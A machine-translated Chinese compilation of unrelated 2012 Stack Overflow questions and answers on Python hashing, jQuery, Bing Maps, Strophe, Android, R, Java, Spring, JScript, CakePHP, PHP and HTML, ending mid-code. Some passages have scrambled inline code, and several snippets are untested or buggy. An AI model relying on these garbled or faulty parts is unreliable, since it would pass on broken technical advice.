无论如何，我们如何解决订购问题？显而易见的 Python 解决方案是 hash`(i, element)`而不是`element`，但是所有元组操作都会将 Cython 版本减慢 12 倍。标准解决方案是在每个异或之间乘以某个数字。但是，当您使用它时，值得尝试让这些值很好地分布在短序列、小`int`元素和其他非常常见的边缘情况下。选择正确的数字很棘手，所以……我只是从[`tuple`](http://hg.python.org/cpython/file/2.7/Objects/tupleobject.c). 这是完整的测试。

_hashtest.pyx：

```
cdef _test_xor(seq):
    cdef long result = 0x345678
    cdef long mult = 1000003
    cdef long h
    cdef long l = 0
    try:
        l = len(seq)
    except TypeError:
        # NOTE: This probably means very short non-len-able sequences
        # will not be spread as well as they should, but I'm not
        # sure what else to do.
        l = 100
    for element in seq:
        try:
            h = hash(element)
        except TypeError:
            h = _test_xor(element)
        result ^= h
        result *= mult
        mult += 82520 + l + l
    result += 97531
    return result

def test_xor(seq):
    return _test_xor(seq) ^ hash(type(seq)) 
```

哈希测试.py：

```
import marshal
import random
import timeit
import pyximport
pyximport.install()
import _hashtest

def test_str(seq):
    return hash(str(seq))

def test_marshal(seq):
    return hash(marshal.dumps(seq))

def test_cy_xor(seq):
    return _hashtest.test_xor(seq)

# This one is so slow that I don't bother to test it...
def test_xor(seq):
    result = hash(type(seq))
    for i, element in enumerate(seq):
        try:
            result ^= hash((i, element))
        except TypeError:
            result ^= hash(i, hash_seq(element))
    return result

smalltest = [1,2,3]
bigtest = [random.randint(10000, 20000) for _ in range(10000)]

def run():
    for seq in smalltest, bigtest:
        for f in test_str, test_marshal, test_cy_xor:
            print('%16s(%5d): %9f' % (f.func_name, len(seq),
                                      timeit.timeit(lambda: f(seq), number=10000)))

if __name__ == '__main__':
    run() 
```

输出：

```
 test_str(    3):  0.014489
test_marshal(    3):  0.008746
 test_cy_xor(    3):  0.004686
    test_str(10000):  8.563252
test_marshal(10000):  2.744564
 test_cy_xor(10000):  0.904398 
```

以下是一些可以加快速度的潜在方法：

*   如果你有很多深度序列，而不是使用`try`around `hash`，调用`PyObject_Hash`并检查 -1。
*   如果你知道你有一个序列（或者，甚至更好，特别是 a `list`），而不仅仅是一个可迭代的，`PySequence_ITEM`(or `PyList_GET_ITEM`) 可能会比`PyIter_Next`上面隐式使用的更快。

在任何一种情况下，一旦您开始调用 C API 调用，通常更容易放弃 Cython 并用 C 编写函数。（您仍然可以使用 Cython 围绕该 C 函数编写一个简单的包装器，而不是手动编写扩展模块.) 到那时，只需`tuplehash`直接借用代码，而不是重新实现相同的算法。

如果您正在寻找一种首先避免这种`O(N)`情况的方法，那是不可能的。如果您查看[`tuple.__hash__`](http://hg.python.org/cpython/file/2.7/Objects/tupleobject.c)、[`frozenset.__hash__`](http://hg.python.org/cpython/file/2.7/Objects/setobject.c)和[`ImmutableSet.__hash__`](http://hg.python.org/cpython/file/2.7/Lib/sets.py)工作方式（最后一个是纯 Python 并且非常易读，顺便说一句），它们都采用`O(N)`. 但是，它们*也*都缓存哈希值。因此，如果您经常对*相同* `tuple`的哈希（而不是不相同但相等的哈希）进行哈希处理，它会接近恒定时间。（它是，您每次调用的次数`O(N/M)`在哪里。）`M``tuple`

如果您可以假设您的`list`对象在调用之间永远不会发生变化，那么您显然可以做同样的事情，例如，将映射`dict`作为外部缓存。但总的来说，这显然不是一个合理的假设。（如果你的对象永远不会发生变异，那么只切换到对象而不用担心所有这些复杂性会更容易。）`id``hash``list``tuple`

但是您可以将您的`list`对象包装在一个添加缓存哈希值成员（或插槽）的子类中，并在收到变异调用（、、、等）时使`append`缓存`__setitem__`无效`__delitem__`。然后你`hash_seq`可以检查一下。

`tuple`最终结果与s: amortized具有相同的正确性和性能`O(N/M)`，除了 for`tuple` `M`是您调用每个相同的次数`tuple`，而 for`list`它是您调用每个相同的次数`list`而不会在两者之间发生变化的次数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:14:52.940

你可以尝试几件事：

使用 marshal.dumps 而不是 str 可能会稍微快一些（至少在我的机器上）：

```
>>> timeit.timeit("marshal.dumps([1,2,3])","import marshal", number=10000)
0.008287056301007567
>>> timeit.timeit("str([1,2,3])",number=10000)
0.01709315717356219 
```

此外，如果您的函数计算成本很高，并且可能自己返回 None，那么您的记忆函数每次都会重新计算它们（我可能会到达这里，但不知道更多，我只能猜测）。结合这两件事给出：

```
import marshal
cache = {}

def memoize(f): 
    """Memoize any function."""

    def decorated(*args):
        key = (f, marshal.dumps(args))
        if key in cache:
            return cache[key]

        cache[key] = f(*args)
        return cache[key]

    return decorated 
```

# jquery - 确认页面：如果设置了 GET 变量则提交，否则允许用户输入代码

> ID：14074251
> 
> 赞同：0
> 
> 时间：2012-12-28T18:48:10.557
> 
> 标签：jquery, get

我有一个简单的 html 表单供用户确认。一旦用户注册，他们就会收到一个指向该页面的链接，其中`GET`附加了一个变量，如下所示：`http://mysite/confirm?code=xyz123`

我正在使用 jquery 验证插件进行所有表单验证。

我有这个验证码：

```
<script type="text/javascript" language="javascript">
    $(document).ready(function(){
        $('#confirm').validate(
        {rules: {
            code: {
                required: true,
                minlength: 32,
                maxlength: 32
            }
        },

        messages: {
            code: {
                required: "Please enter the confirmation code",
                minlength: "Confirmation code is {0} characters",
                maxlength: "Confirmation code is {0} characters"
            }
        },
        submitHandler: function(form){
            $.get("confirmnewuser.php",
                $('#code').val,
                function(data){
                    if(data.status == 0){
                        $('#message').append("<span class='error'>Error: " + data.message + "</span>");
                    }
                    else{
                        $('.container').hide();
                        $('.short_explanation').hide();
                        $('#message').append("<span>" + data.message + "</span>");
                    }
                },
            "json");
        }
        });
    });
</script> 
```

我想测试是否**设置**`GET['code']`了变量，这可以像这样轻松完成：

 **`var $_GET = <?php echo json_encode($_GET); ?>;`

但此时我不知道**在哪里**将它添加到我现有的验证代码中，也不知道如何调用表单提交处理程序（我对 jquery/javascript 相当陌生）。

或者，如果`GET`未设置变量，则页面应正常加载，然后用户可以在输入框中输入他们的代码。

**编辑：添加表单代码**

```
 <form id='confirm' method='get' accept-charset='UTF-8'>

<div class='short_explanation'>* required fields</div>

<div id='message'></div>
<div class='container'>
    <label for='code' >Confirmation Code:* </label><br/>
    <input type='text' name='code' id='code' maxlength="32" /><br/>
</div>
<div class='container'>
    <input type='submit' name='submit' id="submit" value='Confirm' />
</div>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:57:23.537

尝试使用此代码。我还没试过

```
submitHandler: function(form){
            if($('#code').val() == null || $('#code').val() == '')
                 return false;
            $.get("confirmnewuser.php",
                $('#code').val,
                function(data){
                    if(data.status == 0){
                        $('#message').append("<span class='error'>Error: " + data.message + "</span>");
                    }
                    else{
                        $('.container').hide();
                        $('.short_explanation').hide();
                        $('#message').append("<span>" + data.message + "</span>");
                    }
                },
            "json");
        } 
```

而且你不必单独调用提交，提交按钮应该自动完成。

无论如何，您可以使用代码调用提交

```
$('#confirm').submit(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:59:56.907

据我了解情况是，

如果用户带有这个 url->`http://mysite/confirm`

页面将正常加载，用户将输入自己的代码，然后单击提交按钮。

但是如果用户带有这个 url->`http://mysite/confirm?code=xyz123`

表单将加载默认代码“xyz12”，并自动提交。

如果这是正确的，那么这是我的解决方案，

```
$(document).ready(function(){
   var defaultCode = <?php echo json_encode($_GET); ?>;
    if (defaultCode != "") {
       $('#code').val(defaultCode); //set code
       $('#confirm').submit(); //submit form, so submitHandler will handle it
    }
});​ 
```**

# bing - 必应地图：指定的凭据无效

> ID：14074253
> 
> 赞同：4
> 
> 时间：2012-12-28T18:48:17.783
> 
> 标签：bing, bing-api, bing-maps

我似乎无法让 Bing 从我的开发服务器接受我的 API 密钥——我已经从 bingmapsportal.com 站点设置了一个 API 密钥，并将 URL 设置为`http://localhost`并成功生成了密钥。

然后我实现了 API 文档中所示的映射，如下所示：

```
<html>
<head>
<script type="text/javascript" src="http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=7.0"></script>
<script type="text/javascript">
    function getMap(){
        var mapInitOpts = {
            credentials: 'mycredentials',
            mapTypeId: Microsoft.Maps.MapTypeId.road
        };
       var map = new Microsoft.Maps.Map(document.getElementById("map_canvas"), mapInitOpts);
     }
</script>
</head>
  <body onload="getMap();">
   <div id='map_canvas' style="position:absolute; top:0px; left:0px; width:100%; height:100%;"></div><br />
  </body>
</html>  

// map shows invalid credentials error 
```

但是，我总是收到“指定的凭据无效”消息。

关于这个问题的任何想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-29T07:34:14.280

假设您已`'mycredentials'`充当此问题发布的实际凭据的占位符，请尝试使用交互式 SDK 中的 API 密钥：

```
AjtUzWJBHlI3Ma_Ke6Qv2fGRXEs0ua5hUQi54ECwfXTiWsitll4AkETZDihjcfeI 
```

如果上述方法有效，而您获得的密钥无效，则说明您的密钥有问题，您需要与 Bing 开发支持部门合作。

如果上面的键不起作用，那么你的开发环境有问题......

# xmpp - Strophe JS 订阅回调只被调用一次

> ID：14074257
> 
> 赞同：1
> 
> 时间：2012-12-28T18:48:25.040
> 
> 标签：xmpp, publish-subscribe, openfire, strophe

我正在使用 Strophe JS 和 Openfire 来做简单的 pubsub。

**设置 ：**

*   操作系统：Windows 7
*   开火：3.7.0
*   Strophe JS，用于 pubsub 的 Strophe 插件。
*   Tomcat 6：服务网页

**用例：**

* * *

具有两个不同用户会话的两个浏览器窗口（xmpp 会话）

Firefox(user1)---->发布
者 Chrome(user2)---->订阅者

代码：

```
 //XConn represents Strophe Connection
//creating PUBSUB NODE (Firefox)
XConn.pubsub.createNode(
   XConn.jid,
   'pubsub.localhost',
   'PUBSUB_NODE',
   {},
    function (){ 
    }
 );

 //Adding subscriber to created node  (Chrome)
  XConn.pubsub.subscribe(
  XConn.jid,
  'pubsub.localhost',
  'PUBSUB_NODE',
  [],
  function(msg){ console.log(msg);},
  function(sub){ }
   );

   //publishing item to node (Firefox)
   XConn.pubsub.publish(XConn.jid,'pubsub.localhost','PUBSUB_NODE',[ '<item><book xmlns="pubsub:test:book"><title>Book1</title></book></item>']);
  XConn.pubsub.publish(XConn.jid,'pubsub.localhost','PUBSUB_NODE',[ '<item><book    xmlns="pubsub:test:book"><title>Book2</title></book></item>']); 
```

我期望发布者（firefox）发布的两个消息都应该打印在 chrome（订阅者）控制台上。但它只打印第一个，看起来订阅回调只被调用一次。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T20:57:11.320

我发现订阅回调的问题。如果有兴趣获得更多触发器，Strophe JS 插件（pubsub）需要从回调中返回“true”。

因此，将回调更改为返回 true 是可行的。

代码更改为上述代码段：

```
 //Adding subscriber to created node  (Chrome)
 XConn.pubsub.subscribe(
    XConn.jid,
   'pubsub.localhost',
   'PUBSUB_NODE',
    [],
    function(msg){ console.log(msg); return true; },
    function(sub){ return true;}
 ); 
```

# java - Android ItemizedOverlay 缩放画布

> ID：14074258
> 
> 赞同：0
> 
> 时间：2012-12-28T18:48:33.200
> 
> 标签：java, android, android-canvas, google-maps-mobile

我正在尝试在 Android 地图 itemizedOverlay 中缩放图片，我让它工作到可以看到 10 张图片的地步，我得到了 zoomControle，但没有别的，

这是扩展 ItemizedOverlay 的 MapItems 类，欢迎优化

```
import java.util.ArrayList;
import android.content.Context;
import android.graphics.drawable.Drawable;
import android.util.Log;
import com.google.android.maps.ItemizedOverlay;
import com.google.android.maps.MapView;
import com.google.android.maps.OverlayItem;

public class MapItems extends ItemizedOverlay 
{

    private ArrayList<OverlayItem> mOverlays = new ArrayList<OverlayItem>();
    Context mContext;

    public MapItems(Drawable defaultMarker) 
    {
        super(boundCenterBottom(defaultMarker));
    }

    @Override
    public void draw(android.graphics.Canvas canvas,MapView mapView,boolean shadow) 
    {
        /*
        Log.d("MapAc", String.valueOf(mapView.getZoomLevel()));
        if(mapView.getZoomLevel() > 20)
        {
            Log.d("MapAc", "scaling up");
            canvas.scale(1.2f, 1.2f);
        }

        */

        super.draw(canvas,mapView,false);
    }

    public MapItems(Context context) 
    {
        super(boundCenterBottom(context.getResources().getDrawable(R.drawable.app_icon_clean))); 
        mContext = context;
    }

    public void addOverlay(OverlayItem overlay) 
    {
        mOverlays.add(overlay);
        populate();
    }

    public void clearOverlay()
    {
        mOverlays.clear();
    }

    @Override
    protected OverlayItem createItem(int i) 
    {
        return mOverlays.get(i);
    }

    @Override
    public int size() 
    {
        return mOverlays.size();
    }

     @Override
     protected boolean onTap(int index) 
     {
         /* ToDo
       OverlayItem item = mOverlays.get(index);
       AlertDialog.Builder dialog = new AlertDialog.Builder(mContext);
       dialog.setTitle(item.getTitle());
       dialog.setMessage(item.getSnippet());
       dialog.show();
        */
       return true;
    }

} 
```

我一直在尝试使用canvas.Scale在draw方法中进行缩放，但是这似乎在另一个位置重新绘制了画布，以及“原始大小”的旧画布，我不确定我是否正在解决这个问题正确的角度，或者如果只是清除屏幕的问题，我已经使用了几天来解决这个问题，因此非常感谢缩放时正确缩放图片的方法，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:08:36.390

使用新的 MAPS API V2

[博客文章](http://android-developers.blogspot.co.at/2012/12/new-google-maps-android-api-now-part-of.html)

[视频](http://www.youtube.com/watch?v=97HLa739rXU&feature=g-user-u)

# r - 在绘图文本中使用表达式 - 打印变量的值而不是其名称

> ID：14074260
> 
> 赞同：12
> 
> 时间：2012-12-28T18:48:41.470
> 
> 标签：r, plot

我正在尝试获得一个标签以在其中包含指数。这是我的代码

```
vall = format(cor(x,y)*cor(x,y),digits=3)
eq <- expression(paste(R^2," = ",vall,sep=""))
text(legend.x,legend.y,eq,cex=1,font=2) 
```

但是文字看起来像这样 ![在此处输入图像描述](../Images/fbeec65d8224e0870d72fe6f55996f1c.png)

如何让实际的 vall 显示（而不是文本“vall”）

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-28T18:54:33.063

试试`bquote()`，例如：

```
set.seed(1)
vall <- format(rnorm(1),digits=3)
eq <- bquote(bold(R^2 == .(vall)))
sq <- seq(0, 1, by = 0.1)
plot(sq, sq, type = "n")
text(0.5, 0.5, eq) 
```

您的示例不起作用的原因是 R 永远不会结束评估`vall`：

```
> eq2 <- expression(paste(R^2," = ",vall,sep=""))
> eq2
expression(paste(R^2, " = ", vall, sep = "")) 
```

plotmath 试图从中做出一些事情，但基本上`vall`是从字面上理解的。

一般来说，您不需要`paste()`在 plotmath 表达式中，您可以使用标准运算符和通过使用布局运算符构建表达式。例如，对于与您的示例生成的表达式（未评估`vall`）等效的表达式，您真正需要的是：

```
expression(R^2 == vall) 
```

`bquote()`是用表达式中的值替换对象的一种方法。您将要替换为其值的对象包装在`.( )`. 然后，R 将查找对象并获取其值并将其插入到表达式中。

另请参阅`substitute()`使用不同界面的替代方法。

# java - 初始化二维对象数组

> ID：14074261
> 
> 赞同：0
> 
> 时间：2012-12-28T18:48:45.710
> 
> 标签：java, arrays, nullpointerexception, multidimensional-array

我得到一个空指针异常，我以为我已经初始化了数组中的所有对象，但似乎我在某些地方出错了。

这是这个类的代码。在数组外使用 MapBlock 对象时，它可以正常工作。

execption 是当它尝试在更新方法中访问对象时。

```
public class Game { 
    private Scanner scan;

    // map stuff
    MapBlock[][] mapObjects;

    // List of Textures
    Texture path;
    Texture tower;
    Texture grass;

    Game(){ 
        // Textures
        path = loadTexture("path");
        tower = loadTexture("tower");
        grass = loadTexture("grass");

        mapObjects = new MapBlock[24][16];

        loadLevelFile("level1");        

    }

    public void update(){
        if(mapObjects[0][0] == null)
            System.out.println("its null!!!");
        mapObjects[0][0].update();
    }

    public void render(){
        mapObjects[0][0].render();      
    }

    private Texture loadTexture(String imageName){
        try {
            return TextureLoader.getTexture("PNG", new FileInputStream(new File("res/" + imageName + ".png")));
        }catch(FileNotFoundException e){
            e.printStackTrace();
        }catch(IOException r){
            r.printStackTrace();
        }
        return null;
    }

    private void loadLevelFile(String mapName){
        try {
            scan = new Scanner(new File("res/" + mapName + ".txt"));
        } catch (FileNotFoundException e) {
            System.out.println("Could not open "+ mapName +" file!");
            e.printStackTrace();
        }

        String obj;
        int i = 0, t = 0;

        while(scan.hasNext()){
            obj = scan.next();

            if(obj == "o"){
                mapObjects[i][t] = new MapBlock("GRASS", t*32, i*32, grass);

            }else if(obj == "x"){
                mapObjects[i][t] = new MapBlock("PATH", t*32, i*32, path);

            }else if(obj == "i"){
                mapObjects[i][t] = new MapBlock("TOWER", t*32, i*32, tower);                    
            }

            if(i < 24){
                i++;
            }else{
                i = 0;
                t ++;
            }

        }
    }
} 
```

感谢您的任何反馈

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:00:00.897

在你的`loadLevelFile`方法中：

```
-> if(obj == "o"){
// ...
-> }else if(obj == "x"){
// ...  
-> }else if(obj == "i"){
// ...
} 
```

您正在将字符串与`==`and not进行比较`.equals()`，这可能会导致您的`mapObjects`数组的实例化不会发生。

尝试将其更改为：

```
if(obj.equals("o")){
// ...
}else if(obj.equals("x")){
// ...  
}else if(obj.equals("i")){
// ...
} 
```

错误发生在这里：

```
if(mapObjects[0][0] == null)
    System.out.println("its null!!!");
mapObjects[0][0].update(); <- Error happens here 
```

因为对象`mapObjects[0][0]`仍然是`null`，因为`loadLevelFile`方法没有实例化它。

# spring - 主页的 Spring url-pattern 和 @RequestMapping

> ID：14074264
> 
> 赞同：1
> 
> 时间：2012-12-28T18:49:00.683
> 
> 标签：spring, jakarta-ee, spring-mvc

我在 web.xml 中有以下配置：

```
<servlet-mapping>
    <servlet-name>orchard</servlet-name>
    <url-pattern>/orchard/*</url-pattern>
    <url-pattern>/orchard</url-pattern>
</servlet-mapping> 
```

以及以下@RequestMapping

```
@RequestMapping(value={"", "/","/home"}, method=RequestMethod.GET)
public String homePage(Model model, Principal principal, HttpSession session) 
```

但要访问主页，我需要访问：

```
http://host:8080/app/orchard/ or http://host:8080/app/orchard/home 
```

如果我省略斜杠，如下所示：

```
http://host:8080/app/orchard 
```

我得到一个 404。我在这里的配置中做错了吗？

干杯，NFV

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T21:44:45.663

试试这个请求映射，我认为这对你有用：

```
@RequestMapping(value={"/*", "/home"}, method=RequestMethod.GET) 
```

这将是一个包罗万象的方法，如果没有找到任何其他映射，它将默认为这个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-29T02:51:18.017

看起来里面的空间`@RequestMapping`不起作用，试试这个

```
<servlet-mapping>
  <servlet-name>orchard</servlet-name>
  <url-pattern>/</url-pattern>
</servlet-mapping> 
```

更改控制器：

```
@RequestMapping(value={"/orchard","/orchard/home"}, method=RequestMethod.GET)
   public String homePage(Model model, Principal principal, HttpSession session) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:29:36.927

我认为你应该在 webapps 文件夹下创建 index.jsp 页面，然后你应该从那里转发到 home.html，使用 jsp:forward 标签

# javascript - 为什么我的 javascript 文件在一个位置创建文件但试图从另一个位置读取它？

> ID：14074267
> 
> 赞同：1
> 
> 时间：2012-12-28T18:49:31.460
> 
> 标签：javascript, relative-path, createfile

我创建了一个变量来保存相对路径，因为我不能有直接路径，因为它将安装在不同的 PC 上。

```
var mainUrlCONST = "../../annotations/annotate.xml"; 
```

当程序的初始页面加载时，它会检查文件是否存在。如果没有，它会创建它。

现在问题就在这里，它从我想要它的确切位置读取，但如果它在那里看不到文件，它会在 PC 上的其他地方而不是我指定的位置创建它。

这将检查文件：

```
function initializeAnnotationFile()
{
    try
    {
        var connection = new ActiveXObject("Microsoft.XMLHTTP");
        connection.open("GET", mainUrlCONST, false);
        connection.send();

        if ( connection.readyState == 4 )
        {
        response = connection.responseText;
        }

        xml = response; 
        mainExists = true;
    }
        catch(e)
    {
        mainExists = false; 
    }
} 
```

如果文件不存在，这将创建文件：

```
function createAnnotationFile()
{
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var s = fso.CreateTextFile(mainUrlCONST, true);

    s.WriteLine( "<list>" );
    s.WriteLine( "  <section title='Annotations'>" );
    s.WriteLine( "  </section>" );
    s.WriteLine( "</list>" );
} 
```

这是有效的直接路径，如果它有帮助的话。

```
var mainUrlCONST = "G:/folder/annotations/annotate.xml"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:01:21.993

`FSO`相对路径存在问题。所有文档都说，路径可以是绝对路径也可以是相对路径，但就我个人而言，我从来没有使用相对路径。

我在本地应用程序中使用基于安装文件夹的寻址系统。一个简化的版本是这样的：

```
function getInstallBase() {
    var defInstal = 'Application_installation_folder_name',
        selfPath = window.location.pathname.replace(/\\/g,'/');
    if (selfPath.charAt(0) === '/') { // *
        selfPath = selfPath.substring(1, selfPath.length);
    }
    selfPath = selfPath.split(defInstal);
    return selfPath[0] + defInstal + '/';   
}
var defRoot = getInstallBase(); 
```

`*`= IE 返回 /G:/... 当 HTA 返回 G:/...

`defRoot`现在包含安装文件夹的绝对路径，无论它保存在哪里。

将此代码放入应用程序安装文件夹中的 JS 文件中。如果您需要路径，请根据`defRoot`安装文件夹中的 ie 提供路径。在您的情况下（假设`folder`是安装文件夹），您可以像这样使用它：

```
var s = fso.CreateTextFile(defRoot + 'annotations/annotate.xml', true); 
```

我已经将这种技术用于便携式应用程序，它就像一个魅力。您可以将可执行副本复制到记忆棒、CD、DVD 上，无论您想要什么，都无需接触代码。

# cakephp - 高级 CakePHP？

> ID：14074273
> 
> 赞同：1
> 
> 时间：2012-12-28T18:50:20.227
> 
> 标签：cakephp

一个项目需要我用CakePHP，时间很短。我能找到的只是基本知识。在不到 5 分钟的时间内创建多个数据库很容易，但在那之后我迷路了。任何人都可以推荐任何书籍、网站、在线课程、讲座等吗？

我读过使用 CakePHP 可以快速构建应用程序，但是学习曲线很陡峭。我学语言的速度更快。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-30T02:35:36.017

最好和最快的方法是从[http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/blog.html上的博客教程开始](http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/blog.html)

如果您了解 MVC 和 OOP 的基础知识，就很容易赶上！

除此之外，您可以查看其他人的代码并了解它是如何完成的！

CakePHP 的真正魅力在于[插件](http://plugins.cakephp.org)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-29T03:14:48.683

有完整的在线[CakePHP Book](http://book.cakephp.org/2.0/en/index.html)和[CakePHP API 文档](http://api20.cakephp.org/)。

书中有许多描述、教程、示例……等等。

API 详细记录了所有内容，您可以使用它来进一步理解您没有完全从书中获得的任何概念。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-14T16:31:43.437

对于 CakePHP 3.x 文档，请点击此处：[CakePHP 3.x book](http://book.cakephp.org/3.0/en/index.html)。CakePHP 3[评论](http://www.toptal.com/cakephp/cakephp-still-fresh-still-hot)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-06T10:18:12.810

要学习 cakephp，您可以使用以下链接 (1) [http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/blog.html](http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/blog.html) 为了最快的学习，您可以使用这些链接 (2) [http://cake3.codaxis.com/](http://cake3.codaxis.com/)和 (3) [http://demos.developerhints.com/cakephp-cheat-sheet/](http://demos.developerhints.com/cakephp-cheat-sheet/)但应先学习上述第 2 和第 3 教程中使用的关键字和函数的重新编号。您还可以继续在本地机器上练习以正确理解和学习 cakephp。

# php - 通过 PHP/MySQL 构建多维 JSON 数组

> ID：14074277
> 
> 赞同：1
> 
> 时间：2012-12-28T18:51:01.627
> 
> 标签：php, mysql, arrays, json

我正在尝试通过 php 和与 mysql 数据库的连接来构建我认为是 json 中的多维数组。

这是我正在寻找的输出：

```
[{"region":"Americas"},
{"region":"West","division":"Americas","revenues":"100000","headcount":"6"},
{"region":"East","division":"Americas","revenues":"1500000","headcount":"8"},
{"region":"South","division":"Americas","revenues":"1000000","headcount":"7"},
{"office":"San Francisco","location":"50 Kearny Street", "branch":"West"},
{"office":"Los Angeles","location":"200 Sepulveda","branch":"West"},
{"office":"New York","location":"Penn Street","branch":"East"},
{"office":"Philadelphia","location":"155 Trent","branch":"East"},
{"office":"New Jersey","location":"420 Broadway","branch":"East"},
{"office":"Atlanta","location":"39000 Parker","branch":"South"}] 
```

这为我提供了创建适当可视化的图形程序的提要。我的数据库返回上面 JSON 中的所有值（地区、部门、收入等），除了我必须自己编写代码的“分支”。我不能再次确定“区域”（因为图形算法）所以我不得不将它重命名为“分支”。在此当前配置下，“美洲”是顶部节点，下方是“区域”，然后是每个区域下的“分支”（视情况而定）。

到目前为止，我只能使用 PHP 和 json_(encode) 函数构建一个基本的 JSON 数组；为了获得上面的输出，我手动编辑了文件以确保它可以在我的图表中正确呈现，它确实如此。

我要回答的问题是：动态构建上述数组的最快和最简单的方法是什么？通过 PHP 中的循环，我可以想象，但我无法理解那会是什么样子。

我可能遗漏了您需要帮助的信息，所以这只是为了让事情顺利进行。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-10T09:50:29.557

看这个话题：[在php中循环一个多维数组](https://stackoverflow.com/questions/1551822/looping-a-multidimensional-array-in-php)

您可以使用 foreach 构造遍历数组

# html - 在上方插入文字

> ID：14074279
> 
> 赞同：5
> 
> 时间：2012-12-28T18:51:04.957
> 
> 标签：html, css, webshop

以下代码用于将产品添加到购物篮。

我不希望在输入中仅使用图像作为购买按钮，而是希望在背景中添加图像或填充物，并在其上方添加 HTML 文本。

```
<input border="0" src="/images/buy.png" type="image" /> 
```

这是完整的代码：

```
<span class="BuyButton_ProductInfo">
    <table id="BUYSECTION">
        <tbody>
            <tr>
                <td valign="top" align="left">Count<br />
                    <input id="amount" class="TextInputField_ProductInfo" maxlength="6" size="3" name="AMOUNT" value="1" type="text" />
                </td>
                <td>&nbsp;&nbsp;</td>
                <td class="BuyButton_ProductInfo">Buy<br />
                    <input border="0" src="/images/buy.png" type="image" />
                </td>
            </tr>
        </tbody>
    </table>
</span> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T18:58:46.443

不知道我是否正确理解你的问题，

但是，如果您在提交按钮上谈论纯色背景色，则可以使用

```
<input type="submit" style="background-color: black; color: white;" value="your text" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T18:56:54.730

不确定我是否完全理解您要完成的工作？你可以`display`在 CSS 中设置属性吗？

```
#BUYSECTION input[type="image"] {  
  display:block;
} 
```

否则，你能详细说明吗？也许提供一个[JSFiddle](http://jsfiddle.net/)链接来显示问题？

**已编辑**

您是否想要一个可点击的提交按钮，带有图案或“类似按钮”的填充，但在按钮“上方”的不同 z-index 处仍有文本？

HTML：

```
<button type="submit">Buy</button> 
```

CSS：

```
button{
  /* reset the button style properties */
  border:0;
  display:block;
  /* include the image and dimensions */
  width:50px;
  height: 20px;
  background:transparent url("images/buy.png") no-repeat 50% 50%;
  /* format the text */
  text-align:center;
  padding:5px;
  font-weight:bold;
  color:#333;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:28:53.793

尝试这个：

HTML：

```
<input type="button" value="Texto del boton" class="imgButton" />​ 
```

CSS：

```
.imgButton{
background-image:url(/images/buy.png);
width: 100%;
heigth: 100%;    
}​ 
```

萨鲁多斯！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-11-21T14:58:08.427

您可以在输入元素上方插入文本。我在这项工作中使用**标签**元素。您可以使用 CSS 代码编辑标签元素位置。

```
<input src="/images/buy.png" type="image" id="myButton" />
<label for="myButton">Click me or image</label>
```

# c++ - 在 DirectX9 中使用 ASSIMP 加载 .obj 模型

> ID：14074280
> 
> 赞同：3
> 
> 时间：2012-12-28T18:51:08.570
> 
> 标签：c++, directx

这是我第一次发帖。我对这个名为 ASSIMP 的 3d 模型加载库有这个问题。我正在尝试将其集成到示例 Direct3d9 应用程序中。而且进展不顺利。我是一位经验丰富的 C++ 程序员，所以帮助我应该不会太麻烦:)。所以我过去制作了几个 d3d9 应用程序并渲染了手动原语。但现在我正在尝试渲染一个加载了 ASSIMP 的 obj 模型。当我尝试渲染它时，根本没有渲染任何内容。这很奇怪，甚至没有渲染一个多边形。这非常令人沮丧，因为我花了 1 周的时间试图解决这个问题，但在谷歌上搜索没有返回任何有用的结果。老实说，你们是我最后的希望，哈哈。好的，这是我的代码。漂亮请看一下并帮助我了解我做错了什么。

```
bool Mesh::LoadMesh(const std::string& Filename)
{

Assimp::Importer Importer;
const aiScene *pScene = NULL;
const aiMesh *pMesh = NULL;

pScene = Importer.ReadFile(Filename.c_str(), aiProcess_Triangulate | aiProcess_ConvertToLeftHanded | aiProcess_ValidateDataStructure | aiProcess_FindInvalidData);

if (!pScene)
{
    printf("Error parsing '%s': '%s'\n", Filename.c_str(), Importer.GetErrorString());
    return false;
}

pMesh = pScene->mMeshes[0];
if (!pMesh)
{
    printf("Error Finding Model In file.  Did you export an empty scene?");
    return false;
}

for (unsigned int i = 0; i < pMesh->mNumFaces; i++) 
{
    if (pMesh->mFaces[i].mNumIndices == 3)
    {
        m_NumIndices = m_NumIndices + 3;
    }

    else
    {
        printf("Error parsing Faces. Try to Re-Export model from 3d package!");
        return false;
    }
}

m_NumFaces = pMesh->mNumFaces;
m_NumVertecies = pMesh->mNumVertices;

ZeroMemory(&m_pVB, sizeof(m_pVB));

m_pRenderDevice->CreateVertexBuffer(sizeof(Vertex) * m_NumVertecies, 0, VertexFVF, D3DPOOL_DEFAULT, &m_pVB, NULL);

m_pVB->Lock(0, 0, (void**)&m_pVertecies, 0);

for (int i = 0; i < pMesh->mNumVertices; i++)
{
